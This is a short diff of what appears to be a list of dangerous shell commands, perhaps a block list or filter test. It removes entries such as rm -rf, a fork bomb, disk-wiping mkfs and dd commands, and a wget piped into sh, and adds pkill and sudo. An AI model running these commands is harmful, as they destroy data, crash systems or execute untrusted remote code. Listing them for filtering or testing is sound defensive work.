@@ -1,16 +1,5 @@
 shutdown
-chmod
-sudo
+pkill
+testujemy
 sudo su
-apt
-root
-rm
-rm -rf
-:(){ :|: & };:
-mkfs.ext4 /dev/sda1
-> /dev/sda
-dd if=/dev/random of=/dev/sda
-mv ~ /dev/null
-wget http://example.com/something -O – | sh —
-wget
-'shutdown'
+sudo
